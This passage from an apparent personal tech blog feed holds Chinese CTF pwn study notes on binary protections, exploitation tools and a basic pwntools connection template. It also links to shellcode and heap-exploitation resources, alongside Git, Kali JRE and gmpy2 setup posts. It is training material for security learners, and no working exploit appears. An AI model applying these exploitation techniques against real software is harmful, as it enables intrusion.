class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><code class="hljs haml"><br><br><br>### PIE<br><br>&gt; PIE (Position-Independent Executable)<br><br>-<span class="ruby"> 程序的防护措施，编译时生效</span><br><span class="ruby"></span><br>-<span class="ruby"> 随机化ELF文件的映射地址</span><br><span class="ruby"></span><br>-<span class="ruby"> 开启 ASLR 之后，PIE 才会生效</span><br><span class="ruby"></span><br><br><br>### The NX bits<br><br>&gt; The NX bits (the No-eXecute bits)<br><br>-<span class="ruby"> 程序与操作系统的防护措施，编译时决定是否生效，由操作系统实现</span><br><span class="ruby"></span><br>-<span class="ruby"> 通过在内存页的标识中增加“执行”位, 可以表示该内存页是否可以执行, 若程序代码的 EIP 执行至不可运行的内存页, 则 CPU 将直接拒绝执行“指令”造成程序崩溃</span><br><span class="ruby"></span><br>&lt;img src=&quot;Pwn/537371648ede66c371eb4d76cd2ffd9b.png&quot; alt=&quot;image-20220410140915940&quot; style=&quot;zoom: 67%;&quot; /&gt;<br><br><br><br>### Canary<br><br>-<span class="ruby"> 程序的防护措施，编译时生效</span><br><span class="ruby"></span><br>-<span class="ruby"> 在刚进入函数时，在栈上放置一个标志canary，在函数返回时检测其是否被改变。以达到防护栈溢出的目的</span><br><span class="ruby"></span><br>-<span class="ruby"> canary长度为<span class="hljs-number">1</span>字长，其位置不一定与ebp/rbp存储的位置相邻，具体得看程序的汇编操作</span><br><span class="ruby"></span><br><br><br>### RELRO<br><br>&gt; RELRO (RELocate Read-Only)<br><br>-<span class="ruby"> 程序的防护措施，编译时生效</span><br><span class="ruby"></span><br>-<span class="ruby"> 部分 <span class="hljs-symbol">RELRO:</span> 在程序装入后, 将其中一些段(如.dynamic)标记为只读, 防止程序的一些重定位信息被修改</span><br><span class="ruby"></span><br>-<span class="ruby"> 完全 <span class="hljs-symbol">RELRO:</span> 在部分 RELRO 的基础上, 在程序装入时, 直接解析完所有符号并填入对应的值, 此时所有的 GOT 表项都已初始化, 且不装入link_map与_dl_runtime_resolve的地址</span><br><span class="ruby"></span><br><br><br>## PartEx2 PWN Tools<br><br>-<span class="ruby"> IDA Pro</span><br><span class="ruby"></span><br>-<span class="ruby"> pwntools</span><br><span class="ruby"></span>-<span class="ruby"> pwndbg</span><br><span class="ruby"></span>-<span class="ruby"> checksec</span><br><span class="ruby"></span>-<span class="ruby"> ROPgadget</span><br><span class="ruby"></span>-<span class="ruby"> one_gadget</span><br><span class="ruby"></span>-<span class="ruby"> LibcSearcher</span><br><span class="ruby"></span>-<span class="ruby"> main_arena_offset</span><br><span class="ruby"></span><br><br><br>### Pwn tools<br><br>-<span class="ruby"> VMware</span><br><span class="ruby"></span>  -<span class="ruby"> deepin</span><br><span class="ruby"></span>  -<span class="ruby"> Ubuntu</span><br><span class="ruby"></span>  -<span class="ruby"> kali</span><br><span class="ruby"></span>-<span class="ruby"> WSL</span><br><span class="ruby"></span>-<span class="ruby"> shell</span><br><span class="ruby"></span>  -<span class="ruby"> zsh</span><br><span class="ruby"></span>-<span class="ruby"> vim</span><br><span class="ruby"></span>  -<span class="ruby"> %!xxd</span><br><span class="ruby"></span>  -<span class="ruby"> %!xxd -r</span><br><span class="ruby"></span>-<span class="ruby"> python</span><br><span class="ruby"></span>-<span class="ruby"> gdb</span><br><span class="ruby"></span>  -<span class="ruby"> pwndbg</span><br><span class="ruby"></span><br><br><br>-<span class="ruby"> IDA Pro</span><br><span class="ruby"></span>  -<span class="ruby"> 反汇编，静态分析</span><br><span class="ruby"></span>  -<span class="ruby"> F5：反编译（C语言）</span><br><span class="ruby"></span>  -<span class="ruby"> Shift + F12 ：查找字符串</span><br><span class="ruby"></span>  -<span class="ruby"> G：地址调转</span><br><span class="ruby"></span>  -<span class="ruby"> 空格键：进入汇编代码视图</span><br><span class="ruby"></span>  -<span class="ruby"> n：更改变量的名称</span><br><span class="ruby"></span>  -<span class="ruby"> /：注释</span><br><span class="ruby"></span>  -<span class="ruby"> R：</span><br><span class="ruby"></span>-<span class="ruby"> pwntools</span><br><span class="ruby"></span>  -<span class="ruby"> python模块</span><br><span class="ruby"></span>  -<span class="ruby"> pip install pwntools</span><br><span class="ruby"></span>  -<span class="ruby"> from pwn import *</span><br><span class="ruby"></span>  -<span class="ruby"> LibSearcher，依附于python2</span><br><span class="ruby"></span>  -<span class="ruby"> pip --proxy ，使用代理</span><br><span class="ruby"></span><br><br><br>```python<br>from pwn import *<br><br>io = process(&quot;./test&quot;)<br>io = remote(&quot;106.54.129.202&quot;,10002)<br><br>io.recvline()<br>io.recv()<br><br># 字节流<br>io.send(b&quot;abcdefg&quot;)<br>io.send(p64(1))<br>io.send(p32(1))<br>io.send(p32(1) + b&quot;abcdefg&quot;)<br>io.send(p32(1) + b&quot;\x0a&quot;)  # 0x0a、10、\n<br>io.sendline(b&quot;abcdefg&quot;)<br>io.send(b&quot;abcdefg\n&quot;)<br><br># 打包、解包<br>p32(1234)<br>u32(b&#x27;\xc06&#x27;)<br><br># 转化<br>hex(ord(&#x27;#&#x27;))  # 0x23<br>chr(0x23)      # #<br></code></pre></td></tr></table></figure></li></ul><ul><li>pwndbg<ul><li>gdb插件，用于动态调试</li><li>栈使用情况</li><li>peda、gef、pwndbg</li><li>使用：gdb a.out</li></ul></li></ul><p>用 gdb 查看内存：</p><blockquote><p>可以使用 examine 命令（简写是 x ）来查看内存地址中的值。</p><p>格式：x/<nfu> <addr></addr></nfu></p></blockquote><ul><li>说明：x 是 examine 的缩写，n、f、u是可选的参数</li><li>n 是一个正整数，表示需要显示的内存单元的个数，也就是说从当前地址向后显示几个内存单元的内容<ul><li>一个内存单元的大小由后面的 u 定义。</li></ul></li><li>f 表示显示的格式，参见下面。如果地址所指的是字符串，那么格式可以是 s，如果地址是指令地址，那么格式可以是 i。<ul><li>x 按十六进制格式显示变量。 </li><li>d 按十进制格式显示变量。 </li><li>u 按十进制格式显示无符号整型。 </li><li>o 按八进制格式显示变量。</li><li>t 按二进制格式显示变量。 </li><li>a 按十六进制格式显示变量。 </li><li>i 指令地址格式 </li><li>c 按字符格式显示变量。 </li><li>f 按浮点数格式显示变量。</li></ul></li><li>u表示一个地址单元的长度 <ul><li>u 表示从当前地址往后请求的字节数，如果不指定的话，GDB默认是4个bytes。</li><li>当我们指定了字节长度后，GDB会从指内存指定的内存地址开始，读写指定字节，并把其当作一个值取出来。</li><li>b表示单字节， h表示双字节， w表示四字节， g表示八字节</li></ul></li><li><addr> 表示一个内存地址。</addr></li><li>注意：严格区分n和u的关系，n表示单元个数，u表示每个单元的大小。</li></ul><p>命令：x/3uh 0x54320<br>含义：从内存地址0x54320读取内容，h表示以双字节为一个单位，3表示输出三个单位，u表示按无符号十进制显示。</p><ul><li>checksec<ul><li>随pwntools安装的一个命令行工具</li><li>查看二进制文件保护措施的信息</li><li>使用：checksec a.out</li></ul></li><li>ROPgadget</li><li>one_gadget</li><li>LibcSearcher</li><li>main_arena_offset</li></ul><h3 id="Linux基础"><a href="#Linux基础" class="headerlink" title="Linux基础"></a>Linux基础</h3><ul><li>Teminal<ul><li>终端</li><li>可以运行多个shell</li></ul></li><li>shell<ul><li>用户与操作系统交互的接口（GUI图形用户接口/界面）</li><li>zsh、sh、bash</li></ul></li><li><p>Linux快捷键</p><ul><li>Ctrl + D：exit（退出）</li><li>Ctrl + C：中断/终止</li><li>Ctrl + Alt</li><li>Ctrl + -/+</li><li>Ctrl + Shift + C/V</li></ul></li><li><p>Linux命令</p></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ file <span class="hljs-built_in">test</span><span class="hljs-comment"># 识别文件类型</span><br><br><span class="hljs-comment"># 运行文件</span><br>$ ./<span class="hljs-built_in">test</span><br>$ python exp.py<br><br><span class="hljs-comment"># 指定解释器: #!/bin/python3</span><br>$ chmod +x exp.py<br>$ sudo ./exp.py<br><br>$ nc 196.128.0.1 10001<span class="hljs-comment"># 运行远程文件</span><br><br>$ man 3 gets<span class="hljs-comment"># 可以通过一些参数，快速查询linux帮助手册，并且格式化显示。</span><br><br>$ <span class="hljs-built_in">echo</span> &lt;base64&gt; | base64 -d<br><br><span class="hljs-comment"># 在对象文件或二进制文件中查找可打印的字符串</span><br>$ strings phone_book<br>$ strings phone_book | grep fleg<br></code></pre></td></tr></table></figure><h2 id="PartEx3-网站"><a href="#PartEx3-网站" class="headerlink" title="PartEx3 网站"></a>PartEx3 网站</h2><p><a href="https://www.yuque.com/hxfqg9">yichen的信安知识库 · 语雀 (yuque.com)</a></p><p><strong>Shellcode：</strong></p><p><a href="http://shell-storm.org/">shell-storm | Home</a></p><p><strong>Format String Tools and Ref</strong></p><ul><li><p><a href="https://github.com/hellman/libformatstr">https://github.com/hellman/libformatstr</a></p></li><li><p><a href="https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf">https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf</a></p></li><li><p><a href="http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf">http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf</a></p></li></ul><p><strong>Heap:</strong></p><ul><li><p><a href="https://heap-exploitation.dhavalkapil.com/">Preface - heap-exploitation (dhavalkapil.com)</a></p></li><li><p><a href="https://github.com/shellphish/how2heap">https://github.com/shellphish/how2heap</a></p></li><li><p>www.slideshare.net/AngelBoy1?utm_campaign=profiletracking&amp;utm_medium=sssite&amp;utm_source=ssslideview</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Git打标签</title>
    <link href="/2021/12/01/Tools/Git/Git%E6%89%93%E6%A0%87%E7%AD%BE/"/>
    <url>/2021/12/01/Tools/Git/Git%E6%89%93%E6%A0%87%E7%AD%BE/</url>
    
    <content type="html"><![CDATA[<h2 id="Git-打标签"><a href="#Git-打标签" class="headerlink" title="Git 打标签"></a>Git 打标签</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">13562@DESKTOP-8HHTU8A MINGW64 /d/GitHub_Gitee/secretsender (master)<br>$ git status<br>On branch master<br>Your branch is up to date with <span class="hljs-string">&#x27;origin/master&#x27;</span>.<br><br>Changes not staged <span class="hljs-keyword">for</span> commit:<br>  (use <span class="hljs-string">&quot;git add &lt;file&gt;...&quot;</span> to update what will be committed)<br>  (use <span class="hljs-string">&quot;git restore &lt;file&gt;...&quot;</span> to discard changes <span class="hljs-keyword">in</span> working directory)<br>        modified:   secretsender.c<br>        modified:   secretsender.exe<br><br>no changes added to commit (use <span class="hljs-string">&quot;git add&quot;</span> and/or <span class="hljs-string">&quot;git commit -a&quot;</span>)<br><br>13562@DESKTOP-8HHTU8A MINGW64 /d/GitHub_Gitee/secretsender (master)<br>$ git add -A<br><br>13562@DESKTOP-8HHTU8A MINGW64 /d/GitHub_Gitee/secretsender (master)<br>$ git commit -m <span class="hljs-string">&quot;框架优化 and 缓冲区溢出处理&quot;</span><br>[master caf356b] 框架优化 and 缓冲区溢出处理<br> 2 files changed, 310 insertions(+), 209 deletions(-)<br><br>13562@DESKTOP-8HHTU8A MINGW64 /d/GitHub_Gitee/secretsender (master)<br>$ git tag v2.0<br><br>13562@DESKTOP-8HHTU8A MINGW64 /d/GitHub_Gitee/secretsender (master)<br>$ git push origin master<br>Enumerating objects: 7, <span class="hljs-keyword">done</span>.<br>Counting objects: 100% (7/7), <span class="hljs-keyword">done</span>.<br>Delta compression using up to 8 threads<br>Compressing objects: 100% (4/4), <span class="hljs-keyword">done</span>.<br>Writing objects: 100% (4/4), 10.76 KiB | 1.79 MiB/s, <span class="hljs-keyword">done</span>.<br>Total 4 (delta 3), reused 0 (delta 0), pack-reused 0<br>remote: Powered by GITEE.COM [GNK-6.2]<br>To gitee.com:wang-zhenzhao/secretsender.git<br>   41e0f17..caf356b  master -&gt; master<br><br>13562@DESKTOP-8HHTU8A MINGW64 /d/GitHub_Gitee/secretsender (master)<br>$ git tag<br>v1.0<br>v2.0<br><br>13562@DESKTOP-8HHTU8A MINGW64 /d/GitHub_Gitee/secretsender (master)<br>$ git push origin v2.0<br>Total 0 (delta 0), reused 0 (delta 0), pack-reused 0<br>remote: Powered by GITEE.COM [GNK-6.2]<br>To gitee.com:wang-zhenzhao/secretsender.git<br> * [new tag]         v2.0 -&gt; v2.0<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
    <tags>
      
      <tag>git</tag>
      
      <tag>标签</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kali安装jre</title>
    <link href="/2021/11/29/Linux/Kali/kali%E5%AE%89%E8%A3%85jre/"/>
    <url>/2021/11/29/Linux/Kali/kali%E5%AE%89%E8%A3%85jre/</url>
    
    <content type="html"><![CDATA[<p><strong>1、解压到 <code>/opt/</code> 目录：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@kali:~/下载<span class="hljs-comment"># tar -C /opt/ -zxvf jre-8u311-linux-x64.tar.gz </span><br><br>root@kali:~/下载<span class="hljs-comment"># vim ~/.bashrc</span><br></code></pre></td></tr></table></figure><p>添加以下数据（注意版本一致）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># install JAVA JDK</span><br><span class="hljs-built_in">export</span> JAVA_HOME=/opt/jdk1.8.0_311<br><span class="hljs-built_in">export</span> CLASSPATH=.:<span class="hljs-variable">$&#123;JAVA_HOME&#125;</span>/lib<br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure><p><strong>2、加载环境变量：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@kali:~/下载<span class="hljs-comment"># source ~/.bashrc</span><br><br>root@kali:~/下载<span class="hljs-comment"># java -version</span><br>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=<span class="hljs-literal">true</span><br>java version <span class="hljs-string">&quot;1.8.0_311&quot;</span><br>Java(TM) SE Runtime Environment (build 1.8.0_311-b11)<br>Java HotSpot(TM) 64-Bit Server VM (build 25.311-b11, mixed mode)<br><br></code></pre></td></tr></table></figure><p><strong>3、安装注册：</strong></p><blockquote><p><a href="https://cloud.tencent.com/developer/article/1532283">update-alternatives—linux软件版本管理命令 - 腾讯云开发者社区</a></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@kali:~/下载<span class="hljs-comment"># update-alternatives --config java</span><br>有 2 个候选项可用于替换 java (提供 /usr/bin/java)。<br><br>  选择       路径                                          优先级  状态<br>------------------------------------------------------------<br>  0            /usr/lib/jvm/java-11-openjdk-amd64/bin/java      1111      自动模式<br>  1            /usr/lib/jvm/java-11-openjdk-amd64/bin/java      1111      手动模式<br>* 2            /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java   1081      手动模式<br><br>要维持当前值[*]请按&lt;回车键&gt;，或者键入选择的编号：^C<br><br>root@kali:~/下载<span class="hljs-comment"># update-alternatives --install /usr/bin/java java /opt/jre1.8.0_311/bin/java 3</span><br><br>root@kali:~/下载<span class="hljs-comment"># update-alternatives --config java</span><br>有 3 个候选项可用于替换 java (提供 /usr/bin/java)。<br><br>  选择       路径                                          优先级  状态<br>------------------------------------------------------------<br>  0            /usr/lib/jvm/java-11-openjdk-amd64/bin/java      1111      自动模式<br>  1            /opt/jre1.8.0_311/bin/java                       3         手动模式<br>  2            /usr/lib/jvm/java-11-openjdk-amd64/bin/java      1111      手动模式<br>* 3            /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java   1081      手动模式<br><br>要维持当前值[*]请按&lt;回车键&gt;，或者键入选择的编号：^C<br><br>root@kali:~/下载<span class="hljs-comment"># update-alternatives --set java /opt/jre1.8.0_311/bin/java</span><br>update-alternatives: 使用 /opt/jre1.8.0_311/bin/java 来在手动模式中提供 /usr/bin/java (java)<br><br>root@kali:~/下载<span class="hljs-comment"># update-alternatives --config java</span><br>有 3 个候选项可用于替换 java (提供 /usr/bin/java)。<br><br>  选择       路径                                          优先级  状态<br>------------------------------------------------------------<br>  0            /usr/lib/jvm/java-11-openjdk-amd64/bin/java      1111      自动模式<br>* 1            /opt/jre1.8.0_311/bin/java                       3         手动模式<br>  2            /usr/lib/jvm/java-11-openjdk-amd64/bin/java      1111      手动模式<br>  3            /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java   1081      手动模式<br><br>要维持当前值[*]请按&lt;回车键&gt;，或者键入选择的编号：^C<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kali</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>Kali</tag>
      
      <tag>jre</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Crypto中的常用python库</title>
    <link href="/2021/11/25/CTF/Crypto/Crypto%E4%B8%AD%E7%9A%84%E5%B8%B8%E7%94%A8python%E5%BA%93/"/>
    <url>/2021/11/25/CTF/Crypto/Crypto%E4%B8%AD%E7%9A%84%E5%B8%B8%E7%94%A8python%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<h1 id="Crypto中的常用python库"><a href="#Crypto中的常用python库" class="headerlink" title="Crypto中的常用python库"></a>Crypto中的常用python库</h1><h2 id="gmpy2"><a href="#gmpy2" class="headerlink" title="gmpy2"></a>gmpy2</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># pip install gmpy2</span><br>Collecting gmpy2<br>  Using cached gmpy2-2.0.8.zip (280 kB)<br>  Preparing metadata (setup.py) ... <span class="hljs-keyword">done</span><br>Building wheels <span class="hljs-keyword">for</span> collected packages: gmpy2<br>  Building wheel <span class="hljs-keyword">for</span> gmpy2 (setup.py) ... error<br>  ERROR: Command errored out with <span class="hljs-built_in">exit</span> status 1:<br>   <span class="hljs-built_in">command</span>: <span class="hljs-string">&#x27;c:\users\13562\appdata\local\programs\python\python38-32\python.exe&#x27;</span> -u -c <span class="hljs-string">&#x27;import io, os, sys, setuptools, tokenize; sys.argv[0] = &#x27;</span><span class="hljs-string">&quot;&#x27;&quot;</span><span class="hljs-string">&#x27;C:\\Users\\13562\\AppData\\Local\\Temp\\pip-install-m7wq3tdn\\gmpy2_9788db52fac64496b99bd7d41369970a\\setup.py&#x27;</span><span class="hljs-string">&quot;&#x27;&quot;</span><span class="hljs-string">&#x27;; __file__=&#x27;</span><span class="hljs-string">&quot;&#x27;&quot;</span><span class="hljs-string">&#x27;C:\\Users\\13562\\AppData\\Local\\Temp\\pip-install-m7wq3tdn\\gmpy2_9788db52fac64496b99bd7d41369970a\\setup.py&#x27;</span><span class="hljs-string">&quot;&#x27;&quot;</span><span class="hljs-string">&#x27;;f = getattr(tokenize, &#x27;</span><span class="hljs-string">&quot;&#x27;&quot;</span><span class="hljs-string">&#x27;open&#x27;</span><span class="hljs-string">&quot;&#x27;&quot;</span><span class="hljs-string">&#x27;, open)(__file__) if os.path.exists(__file__) else io.StringIO(&#x27;</span><span class="hljs-string">&quot;&#x27;&quot;</span><span class="hljs-string">&#x27;from setuptools import setup; setup()&#x27;</span><span class="hljs-string">&quot;&#x27;&quot;</span><span class="hljs-string">&#x27;);code = f.read().replace(&#x27;</span><span class="hljs-string">&quot;&#x27;&quot;</span><span class="hljs-string">&#x27;\r\n&#x27;</span><span class="hljs-string">&quot;&#x27;&quot;</span><span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-string">&quot;&#x27;&quot;</span><span class="hljs-string">&#x27;\n&#x27;</span><span class="hljs-string">&quot;&#x27;&quot;</span><span class="hljs-string">&#x27;);f.close();exec(compile(code, __file__, &#x27;</span><span class="hljs-string">&quot;&#x27;&quot;</span><span class="hljs-string">&#x27;exec&#x27;</span><span class="hljs-string">&quot;&#x27;&quot;</span><span class="hljs-string">&#x27;))&#x27;</span> bdist_wheel -d <span class="hljs-string">&#x27;C:\Users\13562\AppData\Local\Temp\pip-wheel-12kpn2mk&#x27;</span><br>       cwd: C:\Users\13562\AppData\Local\Temp\pip-install-m7wq3tdn\gmpy2_9788db52fac64496b99bd7d41369970a\<br>  Complete output (5 lines):<br>  running bdist_wheel<br>  running build<br>  running build_ext<br>  building <span class="hljs-string">&#x27;gmpy2&#x27;</span> extension<br>  error: Microsoft Visual C++ 14.0 is required. Get it with <span class="hljs-string">&quot;Microsoft Visual C++ Build Tools&quot;</span>: https://visualstudio.microsoft.com/downloads/<br>  ----------------------------------------<br>  ERROR: Failed building wheel <span class="hljs-keyword">for</span> gmpy2<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># pip install wheel</span><br></code></pre></td></tr></table></figure><p><a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/">Python Extension Packages for Windows - Christoph Gohlke (uci.edu)</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GMPY</span>: supports fast multiple-precision arithmetic.<br><span class="hljs-attribute">Wraps</span> the MPIR, MPFR, and MPC libraries.<br><span class="hljs-attribute">gmpy</span>‑<span class="hljs-number">1</span>.<span class="hljs-number">17</span>‑cp<span class="hljs-number">34</span>‑none‑win_amd<span class="hljs-number">64</span>.whl<br><span class="hljs-attribute">gmpy</span>‑<span class="hljs-number">1</span>.<span class="hljs-number">17</span>‑cp<span class="hljs-number">34</span>‑none‑win<span class="hljs-number">32</span>.whl<br><span class="hljs-attribute">gmpy</span>‑<span class="hljs-number">1</span>.<span class="hljs-number">17</span>‑cp<span class="hljs-number">27</span>‑none‑win_amd<span class="hljs-number">64</span>.whl<br><span class="hljs-attribute">gmpy</span>‑<span class="hljs-number">1</span>.<span class="hljs-number">17</span>‑cp<span class="hljs-number">27</span>‑none‑win<span class="hljs-number">32</span>.whl<br><span class="hljs-attribute">gmpy2</span>‑<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">8</span>‑cp<span class="hljs-number">39</span>‑cp<span class="hljs-number">39</span>‑win_amd<span class="hljs-number">64</span>.whl<br><span class="hljs-attribute">gmpy2</span>‑<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">8</span>‑cp<span class="hljs-number">39</span>‑cp<span class="hljs-number">39</span>‑win<span class="hljs-number">32</span>.whl<br><span class="hljs-attribute">gmpy2</span>‑<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">8</span>‑cp<span class="hljs-number">38</span>‑cp<span class="hljs-number">38</span>‑win_amd<span class="hljs-number">64</span>.whl<br><span class="hljs-attribute">gmpy2</span>‑<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">8</span>‑cp<span class="hljs-number">38</span>‑cp<span class="hljs-number">38</span>‑win<span class="hljs-number">32</span>.whl<br><span class="hljs-attribute">gmpy2</span>‑<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">8</span>‑cp<span class="hljs-number">37</span>‑cp<span class="hljs-number">37</span>m‑win_amd<span class="hljs-number">64</span>.whl<br><span class="hljs-attribute">gmpy2</span>‑<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">8</span>‑cp<span class="hljs-number">37</span>‑cp<span class="hljs-number">37</span>m‑win<span class="hljs-number">32</span>.whl<br><span class="hljs-attribute">gmpy2</span>‑<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">8</span>‑cp<span class="hljs-number">36</span>‑cp<span class="hljs-number">36</span>m‑win_amd<span class="hljs-number">64</span>.whl<br><span class="hljs-attribute">gmpy2</span>‑<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">8</span>‑cp<span class="hljs-number">36</span>‑cp<span class="hljs-number">36</span>m‑win<span class="hljs-number">32</span>.whl<br><span class="hljs-attribute">gmpy2</span>‑<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">8</span>‑cp<span class="hljs-number">35</span>‑cp<span class="hljs-number">35</span>m‑win_amd<span class="hljs-number">64</span>.whl<br><span class="hljs-attribute">gmpy2</span>‑<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span 